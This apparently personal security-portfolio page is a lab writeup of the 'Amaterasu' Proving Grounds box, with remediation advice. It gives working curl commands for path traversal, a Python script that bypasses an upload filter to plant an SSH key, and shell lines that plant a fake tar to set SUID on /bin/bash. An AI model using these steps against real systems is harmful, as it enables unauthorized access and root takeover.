@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Amaterasu — Writeup — Dos Vathanak Botra</title>
+<meta name="description" content="Full compromise of the Amaterasu Linux box: path traversal on a custom REST API, an SSH-key upload via an extension-filter bypass, and a PATH-hijack of a root cron tar job to root. An OffSec Proving Grounds writeup.">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=IBM+Plex+Mono:wght@300;400;500;600&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/base.css">
+<link rel="stylesheet" href="../../css/nav.css">
+<link rel="stylesheet" href="../../css/footer.css">
+<link rel="stylesheet" href="../../css/animations.css">
+<link rel="stylesheet" href="../../css/responsive.css">
+<link rel="stylesheet" href="../writeups.css">
+<link rel="stylesheet" href="../../css/fx.css">
+<script src="../../js/fx-head.js"></script>
+</head>
+<body>
+<div class="fx-cube-cap" aria-hidden="true"></div>
+
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <a href="../../index.html" class="nav-logo" aria-label="Status: Junior">
+    <span class="nav-logo-dot" aria-hidden="true"></span>
+    <span class="nav-logo-key">STATUS:</span>
+    <span class="nav-logo-val">JUNIOR</span>
+  </a>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="../../index.html#about">About</a></li>
+    <li><a href="../../index.html#skills">Skills</a></li>
+    <li><a href="../../index.html#experience">Experience</a></li>
+    <li><a href="../../index.html#certificates">Certs</a></li>
+    <li><a href="../index.html">Writeups</a></li>
+    <li><a href="../../index.html#contact">Contact</a></li>
+  </ul>
+  <div class="nav-right">
+    <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" aria-label="Toggle light and dark theme">
+      <span class="theme-toggle-label" id="themeLabel">Dark</span>
+      <span class="theme-toggle-track"><span class="theme-toggle-thumb"></span></span>
+    </button>
+    <div class="hamburger" id="hamburger" onclick="toggleMenu()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<main class="wu-main">
+  <a href="../index.html" class="wu-back">← All writeups</a>
+
+  <div class="wu-report-head">
+    <span class="badge cat-web">Web</span>
+    <span class="diff diff-medium">Medium</span>
+  </div>
+  <h1 class="wu-page-title">Amaterasu</h1>
+  <p class="wu-meta-line"><b>OffSec Proving Grounds</b> · Linux · boot-to-root · category Pentesting</p>
+
+  <!-- At a glance -->
+  <dl class="wu-glance reveal">
+    <div><dt>Vulnerability</dt><dd>Path traversal on a file-list endpoint → upload-filter bypass → SSH key injection → PATH hijack</dd></div>
+    <div><dt>Impact</dt><dd>Full compromise — local and root flags captured (2/2)</dd></div>
+    <div><dt>Tools</dt><dd>nmap, curl, feroxbuster, ssh-keygen, a small Python client, ssh</dd></div>
+    <div><dt>Given</dt><dd>A single IP, no credentials</dd></div>
+  </dl>
+
+  <div class="wu-flag-wrap">
+    FLAGS&nbsp; <span class="wu-flag-redacted">✓ local + root captured — values redacted</span>
+  </div>
+
+  <!-- Cyber Kill Chain -->
+  <div class="wu-kill-chain">
+    <div class="wu-kill-chain-title">Cyber Kill Chain</div>
+    <div class="wu-chain">
+      <div class="wu-chain-box" data-phase="recon"><span class="step-name">Reconnaissance</span><span class="step-detail">nmap, feroxbuster</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="exploit"><span class="step-name">Exploitation</span><span class="step-detail">path traversal</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="credential"><span class="step-name">Credential Access</span><span class="step-detail">key upload</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="lateral"><span class="step-name">Initial Access</span><span class="step-detail">SSH as alfredo</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="privesc"><span class="step-name">Privilege Escalation</span><span class="step-detail">PATH hijack</span></div>
+      <div class="wu-chain-arrow">→</div>
+      <div class="wu-chain-box" data-phase="impact"><span class="step-name">Impact</span><span class="step-detail">root access</span></div>
+    </div>
+  </div>
+
+  <!-- MITRE ATT&CK Framework -->
+  <div class="wu-mitre-table">
+    <h2 style="border-left: 3px solid var(--magenta); padding-left: 0.85rem; color: var(--text); margin-bottom: 1rem;">MITRE ATT&CK Mapping</h2>
+    <table class="wu-table">
+      <thead>
+        <tr>
+          <th>Tactic</th>
+          <th>Technique</th>
+          <th>ID</th>
+          <th>Evidence</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>Reconnaissance</strong></td>
+          <td>Active Scanning: Vulnerability Scanning</td>
+          <td><a href="https://attack.mitre.org/techniques/T1046/" target="_blank" style="color: var(--cyan);">T1046</a></td>
+          <td>nmap full-port scan found FTP, SSH and two HTTP services</td>
+        </tr>
+        <tr>
+          <td><strong>Discovery</strong></td>
+          <td>Active Scanning: Wordlist Scanning</td>
+          <td><a href="https://attack.mitre.org/techniques/T1595/003/" target="_blank" style="color: var(--cyan);">T1595.003</a></td>
+          <td>feroxbuster revealed the undocumented <code>/help</code> and <code>/info</code> endpoints</td>
+        </tr>
+        <tr>
+          <td><strong>Discovery</strong></td>
+          <td>File and Directory Discovery</td>
+          <td><a href="https://attack.mitre.org/techniques/T1083/" target="_blank" style="color: var(--cyan);">T1083</a></td>
+          <td>an unrestricted <code>dir=</code> parameter walked the whole filesystem to <code>/home/alfredo</code></td>
+        </tr>
+        <tr>
+          <td><strong>Credential Access</strong></td>
+          <td>Unsecured Credentials: SSH Keys</td>
+          <td><a href="https://attack.mitre.org/techniques/T1552/004/" target="_blank" style="color: var(--cyan);">T1552.004</a></td>
+          <td>an attacker-generated public key was written into <code>authorized_keys</code> via the upload endpoint</td>
+        </tr>
+        <tr>
+          <td><strong>Initial Access</strong></td>
+          <td>Exploit Public-Facing Application</td>
+          <td><a href="https://attack.mitre.org/techniques/T1190/" target="_blank" style="color: var(--cyan);">T1190</a></td>
+          <td>the extension filter checked the file part's name while the <code>filename</code> field controlled the write path</td>
+        </tr>
+        <tr>
+          <td><strong>Privilege Escalation</strong></td>
+          <td>Hijack Execution Flow: Path Interception by PATH Environment Variable</td>
+          <td><a href="https://attack.mitre.org/techniques/T1574/007/" target="_blank" style="color: var(--cyan);">T1574.007</a></td>
+          <td>a root cron job prepended a user-writable directory to <code>PATH</code> and called <code>tar</code> by relative name</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- Vulnerability Analysis -->
+  <div class="wu-vuln-analysis">
+    <h3>Vulnerability Analysis</h3>
+    <p><strong>Root Causes:</strong> Three independent weaknesses in one file-upload API, chained into a root shell.</p>
+    <ul style="color: var(--text2); margin-left: 1.3rem;">
+      <li><strong>CWE-22: Improper Limitation of a Pathname to a Restricted Directory</strong> — the <code>dir=</code> parameter on the list endpoint accepted any path, so the whole filesystem was browsable</li>
+      <li><strong>CWE-434: Unrestricted Upload of File with Dangerous Type</strong> — the upload endpoint read its destination path from a separate <code>filename</code> form field it never validated</li>
+      <li><strong>CWE-646: Reliance on File Name or Extension of Externally-Supplied File</strong> — the type check inspected the multipart file part's own name, not the field that actually chose where the data landed, so one field satisfied the filter while the other field did the damage</li>
+      <li><strong>CWE-426: Untrusted Search Path</strong> — a root cron job prepended an attacker-writable directory to <code>PATH</code> and then called a system binary (<code>tar</code>) without an absolute path</li>
+    </ul>
+    <p style="margin-top: 1rem;"><strong>Severity:</strong> No CVSS score applies — these are configuration and code weaknesses on a lab host, not a scored vulnerability in a shipped product. The end result is unauthenticated-to-root compromise through a single custom API.</p>
+    <p><strong>References:</strong>
+      <br><a href="https://cwe.mitre.org/data/definitions/22.html" class="cve-link" target="_blank">CWE-22</a>
+      <a href="https://cwe.mitre.org/data/definitions/434.html" class="cve-link" target="_blank">CWE-434</a>
+      <a href="https://cwe.mitre.org/data/definitions/646.html" class="cve-link" target="_blank">CWE-646</a>
+      <a href="https://cwe.mitre.org/data/definitions/426.html" class="cve-link" target="_blank">CWE-426</a>
+    </p>
+  </div>
+
+  <div class="wu-body">
+
+    <h2>Summary</h2>
+    <p>Amaterasu is a Linux host rated <strong>Medium</strong>, built around a small custom Flask REST API.
+    Every finding came from that one API: a path-traversal bug on its file-listing endpoint mapped out the
+    filesystem and found a user's home directory, and a mismatch between the two fields the upload endpoint
+    reads let an SSH key be written straight into that user's <code>authorized_keys</code>. From there, a root
+    cron job that built its <code>PATH</code> out of a directory the new user could write to handed over a
+    root shell.</p>
+
+    <div class="wu-insight">
+      <p><strong>Key insight:</strong> the upload endpoint's filter and its destination logic each trusted a
+      <em>different</em> piece of attacker-controlled input. Validating one field while acting on another is
+      the same class of bug as validating a cookie while trusting a header — whichever field goes unchecked is
+      the one worth attacking.</p>
+    </div>
+
+    <h2>Recon</h2>
+    <p>A full TCP scan with service and version detection:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>nmap -p- -sV -T4 &lt;target&gt;</code></pre>
+    </div>
+
+    <table class="wu-table">
+      <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+      <tbody>
+        <tr><td>21</td><td>FTP</td><td>vsftpd 3.0.3</td></tr>
+        <tr><td>25022</td><td>SSH</td><td>OpenSSH 8.6, non-standard port</td></tr>
+        <tr><td>33414</td><td>HTTP</td><td>Werkzeug / Python 3.9.13 — a custom Flask API</td></tr>
+        <tr><td>40080</td><td>HTTP</td><td>Apache 2.4.53 (Fedora)</td></tr>
+      </tbody>
+    </table>
+
+    <p>Anonymous FTP login was accepted, but the directory listing never came back over the lab VPN's data
+    connection. The Werkzeug port stood out as the "custom REST API" the box was built around, so it became
+    the focus.</p>
+
+    <h2>Enumeration — mapping the API</h2>
+    <p>The API root returned a bare 404, so the next step was finding its routes:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>feroxbuster -u http://&lt;target&gt;:33414 -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre>
+    </div>
+
+    <p>Two self-documenting endpoints turned up, <code>/help</code> and <code>/info</code>:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>curl -s http://&lt;target&gt;:33414/help
+["GET /info : General Info","GET /help : This listing",
+ "GET /file-list?dir=/tmp : List of the files","POST /file-upload : Upload files"]</code></pre>
+    </div>
+
+    <p>Four endpoints confirmed: <code>/info</code>, <code>/help</code>, <code>/file-list</code> and
+    <code>/file-upload</code>. The API told us its own attack surface.</p>
+
+    <h2>Path traversal — walking the filesystem</h2>
+    <p>The <code>dir</code> parameter on <code>/file-list</code> was passed straight to the filesystem with no
+    containment check:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>curl -s "http://&lt;target&gt;:33414/file-list?dir=."
+["boot","dev","proc","run","sys","tmp","etc","root","var","usr", ...]
+
+curl -s "http://&lt;target&gt;:33414/file-list?dir=/home"
+["alfredo"]
+
+curl -s "http://&lt;target&gt;:33414/file-list?dir=/home/alfredo"
+[".bash_logout",".bash_profile",".bashrc","local.txt",".ssh","restapi",".bash_history"]
+
+curl -s "http://&lt;target&gt;:33414/file-list?dir=/home/alfredo/.ssh"
+["id_rsa","id_rsa.pub"]</code></pre>
+    </div>
+
+    <p>That one parameter named a user (<code>alfredo</code>), located the flag (<code>local.txt</code>), and
+    confirmed an existing <code>.ssh</code> directory — a full map of the target without a single credential.</p>
+
+    <div class="wu-insight">
+      <p><strong>Why this matters:</strong> an endpoint meant to list a scratch directory was never restricted
+      to one. Any parameter that becomes part of a filesystem path has to be resolved and checked against an
+      allowed root before use — "it's just a listing feature" is exactly how traversal bugs get shipped.</p>
+    </div>
+
+    <h2>Foothold — reverse-engineering the upload endpoint</h2>
+    <p>The upload endpoint was undocumented beyond its existence, so its behaviour was worked out one response
+    at a time with a small Python client, rebuilt in stages.</p>
+
+    <p><strong>Stage 1 — scaffolding.</strong> A bare <code>list_dir()</code> helper confirmed the client could
+    talk to the API at all.</p>
+
+    <p><strong>Stage 2 — first upload attempt.</strong> Posting a file with only a multipart file part failed
+    with <code>{"message":"No filename part in the request"}</code> — the API reads its destination from a
+    <em>separate</em> <code>filename</code> form field, not from the uploaded part's own name.</p>
+
+    <p><strong>Stage 3 — adding the field.</strong> Once a <code>filename</code> field was sent alongside the
+    file, the upload succeeded and landed in <code>/tmp</code> — fixing the base directory any traversal would
+    need to climb out of.</p>
+
+    <p><strong>Stage 4 — aiming at <code>authorized_keys</code>.</strong> Setting <code>filename</code> to
+    <code>../home/alfredo/.ssh/authorized_keys</code> hit an extension filter:
+    <code>{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}</code>. The filter clearly looked at
+    something — but <em>which</em> field?</p>
+
+    <p><strong>Stage 5 — the bypass.</strong> The filter was checking the <strong>file part's</strong> own name,
+    while the <strong>filename field</strong> alone controlled where the bytes were written. Giving the file
+    part an allowed extension while keeping the traversal path in the <code>filename</code> field satisfied the
+    filter and still wrote wherever we wanted:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>python · amaterasu.py</span><button class="wu-copy">copy</button></div>
+<pre><code>import requests
+
+BASE = "http://&lt;target&gt;:33414"
+
+def list_dir(path):
+    r = requests.get(f"{BASE}/file-list", params={"dir": path})
+    return r.json()
+
+def upload(local_file, remote_name):
+    with open(local_file, "rb") as f:
+        r = requests.post(f"{BASE}/file-upload",
+                          files={"file": ("payload.txt", f)},   # allowed ext -> passes filter
+                          data={"filename": remote_name})       # traversal path -> controls write
+    return r.status_code, r.text
+
+if __name__ == "__main__":
+    code, body = upload("amaterasu.pub", "../home/alfredo/.ssh/authorized_keys")
+    print(f"Status: {code}")
+    print(f"Body: {body}")
+    print(list_dir("/home/alfredo/.ssh"))</code></pre>
+    </div>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell · result</span><button class="wu-copy">copy</button></div>
+<pre><code>Status: 201
+Body: {"message":"File successfully uploaded"}
+
+['id_rsa', 'id_rsa.pub', 'authorized_keys']</code></pre>
+    </div>
+
+    <p>A freshly generated keypair's public half was now trusted by <code>alfredo</code>'s account.</p>
+
+    <h2>Local flag</h2>
+    <p>SSH with the matching private key logged straight in:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>ssh -i amaterasu alfredo@&lt;target&gt; -p 25022
+[alfredo@fedora ~]$ cat local.txt
+&lt;redacted&gt;</code></pre>
+    </div>
+
+    <p>The box resets <code>authorized_keys</code> on restart, so the upload step is re-run whenever the lab
+    instance restarts — a single script re-plants the key.</p>
+
+    <h2>Privilege escalation — PATH hijack of a root cron job</h2>
+    <p>Alfredo's home directory held a leftover copy of the API's own source, <code>restapi/</code>, which the
+    traversal scan had already surfaced. The system crontab ran a backup script as root every minute:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+*/1 * * * * root /usr/local/bin/backup-flask.sh
+
+cat /usr/local/bin/backup-flask.sh
+#!/bin/sh
+export PATH="/home/alfredo/restapi:$PATH"
+cd /home/alfredo/restapi
+tar czf /tmp/flask.tar.gz *</code></pre>
+    </div>
+
+    <p>The script itself was root-owned and not writable, but it prepended <code>/home/alfredo/restapi</code> —
+    writable by <code>alfredo</code> — to root's <code>PATH</code>, then invoked <code>tar</code> by relative
+    name. Root would run whichever <code>tar</code> appeared first on that <code>PATH</code>:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>echo '#!/bin/bash' > ~/restapi/tar
+echo 'chmod u+s /bin/bash' >> ~/restapi/tar
+chmod +x ~/restapi/tar</code></pre>
+    </div>
+
+    <p>Within a minute the cron job fired, ran the planted <code>tar</code> as root, and set the SUID bit on
+    <code>/bin/bash</code>:</p>
+
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>ls -la /bin/bash
+-rwsr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash   # note the 's'
+
+bash -p
+# id
+uid=1000(alfredo) gid=1000(alfredo) euid=0(root) groups=1000(alfredo)
+# cat /root/proof.txt
+&lt;redacted&gt;</code></pre>
+    </div>
+
+    <p>Root flag captured — full compromise achieved.</p>
+
+    <h2>Findings &amp; remediation</h2>
+    <table class="wu-table">
+      <thead><tr><th>#</th><th>Finding</th><th>Severity</th><th>Remediation</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>Unrestricted <code>dir=</code> parameter on the list endpoint</td><td>Medium</td><td>Canonicalize and confirm the resolved path stays within an allowed root before listing it</td></tr>
+        <tr><td>2</td><td>Upload destination taken from an unvalidated <code>filename</code> field</td><td>Critical</td><td>Use <code>secure_filename()</code> or an equivalent allow-list; never build a write path from raw user input</td></tr>
+        <tr><td>3</td><td>Type filter checks a different field than the one that controls the write</td><td>Critical</td><td>Validate the exact value used for the destination, not a cosmetic field sent alongside it; check content, not just a name</td></tr>
+        <tr><td>4</td><td>Root cron script relies on a relative binary name and a writable <code>PATH</code> entry</td><td>Critical</td><td>Call binaries by absolute path in privileged scripts; never prepend a user-writable directory to root's <code>PATH</code>; run backup jobs as a dedicated unprivileged account</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Takeaways</h2>
+    <ul>
+      <li><strong>Read every field the server accepts, not just the obvious one.</strong> The whole foothold
+      came from noticing the upload endpoint trusted two different fields for two different jobs, and only
+      validated one of them.</li>
+      <li><strong>A listing endpoint is still an endpoint.</strong> "Just shows files in a scratch folder" is a
+      claim worth testing, not trusting.</li>
+      <li><strong>PATH hijacks hide in automation, not just interactive shells.</strong> A cron job nobody
+      watches closely is a quiet way to run attacker code as root once per minute.</li>
+    </ul>
+
+  </div>
+
+  <!-- References & Standards Alignment -->
+  <div class="wu-references">
+    <h3>References & Standards</h3>
+    <ul>
+      <li class="ref-category">MITRE Framework</li>
+      <li><a href="https://attack.mitre.org/" target="_blank">MITRE ATT&CK — Adversary Tactics, Techniques, and Common Knowledge</a></li>
+
+      <li class="ref-category">NIST Cybersecurity Framework</li>
+      <li><a href="https://www.nist.gov/cyberframework" target="_blank">NIST Cybersecurity Framework (CSF) — Identify, Protect, Detect, Respond, Recover</a></li>
+      <li><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf" target="_blank">NIST SP 800-61: Computer Security Incident Handling Guide</a></li>
+
+      <li class="ref-category">OWASP &amp; CWE</li>
+      <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10 — Most Critical Web Application Security Risks</a></li>
+      <li><a href="https://cwe.mitre.org/" target="_blank">CWE — Common Weakness Enumeration</a></li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" target="_blank">OWASP File Upload Cheat Sheet</a></li>
+
+      <li class="ref-category">Security Guidance</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html" target="_blank">OWASP Path Traversal Cheat Sheet</a></li>
+      <li><a href="https://www.cisecurity.org/cis-benchmarks/" target="_blank">CIS Benchmarks — Security Configuration Standards</a></li>
+    </ul>
+  </div>
+</main>
+
+<footer>
+  <div class="footer-name">DOS VATHANAK BOTRA</div>
+  <div class="footer-copy">© 2025 Dos Vathanak Botra. All rights reserved. · Phnom Penh, Cambodia</div>
+  <div class="footer-links">
+    <a href="../../index.html#hero">Home</a>
+    <a href="../index.html">Writeups</a>
+    <a href="../../index.html#contact">Contact</a>
+  </div>
+</footer>
+
+<script src="../../js/theme.js"></script>
+<script src="../../js/nav.js"></script>
+<script src="../../js/fx.js"></script>
+<script src="../writeups.js"></script>
+<script src="../../js/analytics.js"></script>
+</body>
+</html>
